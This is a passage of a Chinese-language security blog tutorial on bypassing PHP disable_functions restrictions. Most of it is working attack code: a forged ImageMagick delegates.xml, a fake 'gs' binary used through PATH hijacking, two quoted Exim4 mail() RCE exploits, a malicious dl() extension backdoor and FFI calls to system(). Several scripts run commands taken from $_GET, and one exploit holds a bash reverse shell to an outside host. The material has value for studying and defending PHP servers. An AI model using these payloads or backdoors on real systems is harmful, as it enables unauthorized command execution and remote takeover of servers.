                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">528.0</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">233.3</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">526.9</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">236.5</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">525.1</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">239.5</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">522.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">242.2</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">495.9</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">266.3</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mi">493</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">268.5</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">489.7</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">269.9</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">486.4</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">270.8</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">482.9</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">270.9</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">479.5</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">270.4</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">476.2</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">269.3</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">473.2</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">267.5</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">470.4</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mi">265</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mi">350</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">131.2</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">347.8</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">128.3</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">346.4</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">125.1</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">345.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">121.7</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">345.4</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">118.2</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mi">346</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">114.8</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">347.1</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">111.5</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">348.9</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">108.5</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">351.4</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">105.8</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">378.1</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">81.72</span> <span class="p">),</span>
              <span class="p">);</span>

<span class="cm">/* This ImagickPixel is used to set background color */</span>
<span class="nv">$ImagickPixel</span><span class="o">-&gt;</span><span class="na">setColor</span><span class="p">(</span> <span class="s1">&#39;gray&#39;</span> <span class="p">);</span>

<span class="cm">/* Create new image, set color to gray and format to png*/</span>
<span class="nv">$Imagick</span><span class="o">-&gt;</span><span class="na">newImage</span><span class="p">(</span> <span class="mi">700</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="nv">$ImagickPixel</span> <span class="p">);</span>
<span class="nv">$Imagick</span><span class="o">-&gt;</span><span class="na">setImageFormat</span><span class="p">(</span> <span class="s1">&#39;png&#39;</span> <span class="p">);</span>

<span class="cm">/* Create the polygon*/</span>
<span class="nv">$ImagickDraw</span><span class="o">-&gt;</span><span class="na">polygon</span><span class="p">(</span> <span class="nv">$array</span> <span class="p">);</span>

<span class="cm">/* Render the polygon to image*/</span>
<span class="nv">$Imagick</span><span class="o">-&gt;</span><span class="na">drawImage</span><span class="p">(</span> <span class="nv">$ImagickDraw</span> <span class="p">);</span>

<span class="cm">/* Send headers and output the image */</span>
<span class="nx">header</span><span class="p">(</span> <span class="s2">&#34;Content-Type: image/</span><span class="si">{</span><span class="nv">$Imagick</span><span class="o">-&gt;</span><span class="na">getImageFormat</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">);</span>
<span class="c1">#echo $Imagick-&gt;getImageBlob( );
</span><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;Done.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p>将<code>png.c</code>编译成<code>png.so</code>，执行<code>exp.php</code>：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124223833824.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124223833824.png, https://gitee.com/leonsec/images/raw/master/image-20210124223833824.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124223833824.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124223833824.png"
        title="image-20210124223833824" /></p>
<h3 id="magick_configure_path">MAGICK_CONFIGURE_PATH</h3>
<blockquote>
<p>Set path where ImageMagick can locate its configuration files. Use this search path to search for configuration (.xml) files.</p>
</blockquote>
<p><a href="https://imagemagick.org/source/delegates.xml" target="_blank" rel="noopener noreffer">delegates.xml</a>：</p>
<blockquote>
<p>Associate delegate programs with certain image formats. ImageMagick relies on a number of delegate programs to support certain image formats such as <a href="http://ufraw.sourceforge.net/" target="_blank" rel="noopener noreffer">ufraw-batch</a> to read raw camera formats or <a href="http://www.cs.wisc.edu/~ghost/" target="_blank" rel="noopener noreffer">Ghostscript</a> to read Postscript images. Use this configuration file to map an input or output format to an external delegate program.</p>
</blockquote>
<p>官方文档中描述<code>MAGICK_CONFIGURE_PATH</code>为配置文件的路径，使用此搜索路径搜索配置（.xml）文件，那么结合<code>putenv</code> 我们就可以控制<code>ImageMagick</code>的配置</p>
<p>又发现<code>delegates.xml</code>这个文件，定义了<code>ImageMagick</code>处理各种文件类型的规则和执行的系统命令</p>
<p>所以我们可以伪造一个<code>delegates.xml</code>，并配置搜索路径，<code>ImageMagick</code>解析对应格式时就会执行我们构造的恶意命令</p>
<p>delegates.xml:</p>
<p>找到正常情况下解析<code>EPT</code>文件时的相关配置：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;delegatemap&gt;</span>
<span class="nt">&lt;delegate</span> <span class="na">decode=</span><span class="s">&#34;ps:alpha&#34;</span> <span class="na">stealth=</span><span class="s">&#34;True&#34;</span> <span class="na">command=</span><span class="s">&#34;&amp;quot;gs&amp;quot; -sstdout=%%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pngalpha&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&#34;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/delegatemap&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>修改为自定义命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;delegatemap&gt;</span>
  <span class="nt">&lt;delegate</span> <span class="na">decode=</span><span class="s">&#34;ps:alpha&#34;</span> <span class="na">command=</span><span class="s">&#34;sh -c &amp;quot;echo &#39;MAGICK_CONFIGURE_PATH&#39; &gt; /tmp/leon&amp;quot;&#34;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/delegatemap&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>configure.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;MAGICK_CONFIGURE_PATH=/tmp/&#39;</span><span class="p">);</span>
<span class="nv">$img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Imagick</span><span class="p">(</span><span class="s1">&#39;/tmp/1.ept&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210125104416924.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210125104416924.png, https://gitee.com/leonsec/images/raw/master/image-20210125104416924.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210125104416924.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210125104416924.png"
        title="image-20210125104416924" /></p>
<p>可以看到成功执行了<code>delegates.xml</code>中自定义的命令</p>
<h2 id="覆盖path">覆盖PATH</h2>
<p>前面我们知道，<code>ImageMagick</code>在解析特定格式文件的时候会调用外部程序，如<code>Ghostscript</code>和<code>FFmpeg</code>，还有<code>mail()</code>、<code>error_log()</code>等函数会调用<code>sendmail</code>，在环境允许的情况下可以覆盖环境变量<code>PATH</code>，执行我们生成的可执行文件</p>
<p>以<code>EPT</code>文件为例，会调用<code>gs</code>，我们可以伪造一个恶意<code>gs</code></p>
<p>gs.c:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;PATH&#34;</span><span class="p">);</span>
        <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#34;echo &#39;cover path&#39; &gt; /tmp/leon&#34;</span><span class="p">;</span>
        <span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>生成可执行文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc gs.c -o gs
</code></pre></td></tr></table>
</div>
</div><p>gs.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;PATH=/tmp&#39;</span><span class="p">);</span>
<span class="nx">chmod</span><span class="p">(</span><span class="s1">&#39;/tmp/gs&#39;</span><span class="p">,</span><span class="s1">&#39;0777&#39;</span><span class="p">);</span>
<span class="nv">$img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Imagick</span><span class="p">(</span><span class="s1">&#39;/tmp/1.ept&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210125175226966.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210125175226966.png, https://gitee.com/leonsec/images/raw/master/image-20210125175226966.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210125175226966.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210125175226966.png"
        title="image-20210125175226966" /></p>
<h2 id="exim4">Exim4</h2>
<blockquote>
<p><strong>-be</strong></p>
<p>Run Exim in expansion testing mode. Exim discards its root privilege, to prevent ordinary users from using this mode to read otherwise inaccessible files. If no arguments are given, Exim runs interactively, prompting for lines of data. Otherwise, it processes each argument in turn.</p>
</blockquote>
<p>exim的<code>-be</code>参数支持运行扩展模式，具体用法参考：<a href="http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html" target="_blank" rel="noopener noreffer">String expansions (exim.org)</a></p>
<p>其中可以利用的有：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="si">${</span><span class="nv">run</span><span class="p">{&lt;command&gt; &lt;args&gt;</span><span class="si">}</span><span class="o">{</span>&lt;string1&gt;<span class="o">}{</span>&lt;string2&gt;<span class="o">}}</span>
//执行命令&lt;command&gt; &lt;args&gt;，成功返回string1，失败返回string2
<span class="si">${</span><span class="nv">substr</span><span class="p">{&lt;string1&gt;</span><span class="si">}</span><span class="o">{</span>&lt;string2&gt;<span class="o">}{</span>&lt;string3&gt;<span class="o">}}</span>
//字符串的截取，在string3中从string1开始截取string2个字符
<span class="si">${</span><span class="nv">readfile</span><span class="p">{&lt;file name&gt;</span><span class="si">}</span><span class="o">{</span>&lt;eol string&gt;<span class="o">}}</span>
//读文件file name，以eol string分割
<span class="si">${</span><span class="nv">readsocket</span><span class="p">{&lt;name&gt;</span><span class="si">}</span><span class="o">{</span>&lt;request&gt;<span class="o">}{</span>&lt;timeout&gt;<span class="o">}{</span>&lt;eol string&gt;<span class="o">}{</span>&lt;fail string&gt;<span class="o">}}</span>
//发送socket消息，消息内容为request
</code></pre></td></tr></table>
</div>
</div><p>这种方式年代久远，而且需要特定环境，不大可能遇到，就不找环境复现了，给出两个exp：</p>
<p><a href="https://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html" target="_blank" rel="noopener noreffer">Exim_mail_bypass_disable_function - l3m0n</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;lemon&#39;</span><span class="p">];</span>
<span class="nv">$result_file</span> <span class="o">=</span> <span class="s2">&#34;/tmp/test.txt&#34;</span><span class="p">;</span>
<span class="nv">$tmp_file</span> <span class="o">=</span> <span class="s1">&#39;/tmp/aaaaaaaaaaa.sh&#39;</span><span class="p">;</span>
<span class="nv">$command</span> <span class="o">=</span> <span class="nv">$c</span> <span class="o">.</span> <span class="s1">&#39;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$result_file</span><span class="p">;</span>
<span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$tmp_file</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
<span class="nv">$payload</span> <span class="o">=</span> <span class="s2">&#34;-be </span><span class="se">\$</span><span class="s2">{run{/bin/bash</span><span class="se">\$</span><span class="s2">{substr{10}{1}{</span><span class="se">\$</span><span class="s2">tod_log}}/tmp/aaaaaaaaaaa.sh}{ok}{error}}&#34;</span><span class="p">;</span>
<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$payload</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$result_file</span><span class="p">);</span>
<span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp_file</span><span class="p">);</span>
<span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$result_file</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p><a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" target="_blank" rel="noopener noreffer">ExploitBox.io - Pwning-PHP-Mail-Function-For-Fun-And-RCE</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">// RCE via mail() vector on Exim4 MTA
</span><span class="c1">// Attacker&#39;s cmd is passed on STDIN by mail() within $body
</span><span class="c1">// Discovered by:
</span><span class="c1">// Dawid Golunski - @dawid_golunski - https://legalhackers.com
</span><span class="c1"></span> 
	<span class="nv">$sender</span> <span class="o">=</span> <span class="s2">&#34;attacker@anyhost -be&#34;</span><span class="p">;</span>
	<span class="nv">$body</span>   <span class="o">=</span> <span class="s1">&#39;Exec: ${run{/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/threadhunter.org/80 0&gt;&amp;1&#34;}{yes}{no}}&#39;</span><span class="p">;</span>
	<span class="c1">// ^ unfiltered vars, coming from attacker via GET, POST etc.
</span><span class="c1"></span> 
	<span class="nv">$to</span> <span class="o">=</span> <span class="s2">&#34;john@localhost&#34;</span><span class="p">;</span>
	<span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&#34;Exim RCE PoC&#34;</span><span class="p">;</span>
	<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&#34;From: mike@localhost&#34;</span><span class="p">;</span>
 
	<span class="nx">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$body</span><span class="p">,</span><span class="nv">$headers</span><span class="p">,</span> <span class="s2">&#34;-f </span><span class="si">$sender</span><span class="s2"> &#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><h2 id="dl">dl</h2>
<p><code>dl()</code>函数允许在php脚本里动态加载php模块，默认是加载<code>extension_dir</code>目录里的扩展，当<code>php.ini</code>中<code>enable_dl</code>为<code>On</code>时，支持动态加载so，可以使用目录穿越的方式加载任意目录的恶意so模块</p>
<blockquote>
<p>This function was removed from most SAPIs in PHP 5.3.0, and was removed from PHP-FPM in PHP 7.0.0.</p>
</blockquote>
<p>具体php自定义模块编写方法可以参考：<a href="https://www.cnblogs.com/h2zZhou/p/7277823.html" target="_blank" rel="noopener noreffer">手把手教你编写一个简单的PHP模块形态的后门 - h2z</a></p>
<p>主要功能函数为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">PHP_FUNCTION</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">command_len</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">ZEND_NUM_ARGS</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">zend_parse_parameters</span><span class="p">(</span><span class="n">ZEND_NUM_ARGS</span><span class="p">()</span> <span class="n">TSRMLS_CC</span><span class="p">,</span><span class="s">&#34;s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">command</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">command_len</span><span class="p">)</span> <span class="o">==</span> <span class="n">FAILURE</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">WRONG_PARAM_COUNT</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
        <span class="n">zend_printf</span><span class="p">(</span><span class="s">&#34;I recieve %s&#34;</span><span class="p">,</span><span class="n">command</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>dl.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">dl</span><span class="p">(</span><span class="s1">&#39;../../../../../../../../../tmp/shell.so&#39;</span><span class="p">);</span>
<span class="nv">$cmd</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; 2&gt;&amp;1&gt;tmp.txt&#34;</span><span class="p">;</span>
<span class="nx">shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;tmp.txt&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p>或者使用蚁剑项目写好的<code>ant.c</code>自己编译一下：<a href="https://github.com/AntSwordProject/ant_php_extension" target="_blank" rel="noopener noreffer">AntSwordProject/ant_php_extension</a></p>
<p>或者：<a href="https://github.com/w181496/FuckFastcgi/tree/master/ext_example/system" target="_blank" rel="noopener noreffer">FuckFastcgi/ext_example/system at master · w181496/FuckFastcgi</a></p>
<h2 id="ffi">FFI</h2>
<blockquote>
<p>FFI (Foreign Function Interface)</p>
<p>This extension allows the loading of shared libraries ( or ), calling of C functions and accessing of C data structures in pure PHP, without having to have deep knowledge of the Zend extension API, and without having to learn a third “intermediate” language.</p>
</blockquote>
<p><code>FFI</code>是PHP7.4(PHP 7 &gt;= 7.4.0)新增加的特性，相当于外部函数接口，此扩展允许在PHP中加载共享库或调用C函数以及访问C数据结构
所以我们可以通过php代码调用C的<code>system</code>函数，绕过<code>disable_function</code></p>
<p>先声明C中的命令执行函数，然后再通过<code>FFI</code>变量调用该C函数即可</p>
<p>需要用到<code>FFI::cdef</code>，有两个参数：</p>
<blockquote>
<p><strong>code</strong></p>
<p>A string containing a sequence of declarations in regular C language (types, structures, functions, variables, etc). Actually, this string may be copy-pasted from C header files.</p>
<p><strong>lib</strong></p>
<p>The name of a shared library file, to be loaded and linked with the definitions.</p>
</blockquote>
<p>第一个参数为需要声明的C代码，第二个参数为指定共享库，如果省略，会默认全局搜索（If lib is omitted, platforms supporting RTLD_DEFAULT attempt to lookup symbols declared in code in the normal global scope.）</p>
<p>需在<code>php.ini</code>中开启<code>ffi.enable=true</code>，默认为<code>ffi.enable=preload</code></p>
<p>ffi.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$ffi</span> <span class="o">=</span> <span class="nx">FFI</span><span class="o">::</span><span class="na">cdef</span><span class="p">(</span><span class="s2">&#34;int system(const char *command);&#34;</span><span class="p">);</span>
<span class="nv">$ffi</span><span class="o">-&gt;</span><span class="na">system</span><span class="p">(</span><span class="s2">&#34;whoami &gt; /tmp/123&#34;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/tmp/123&#34;</span><span class="p">);</span>
<span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;/tmp/123&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129101638327.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129101638327.png, https://gitee.com/leonsec/images/raw/master/image-20210129101638327.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129101638327.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129101638327.png"
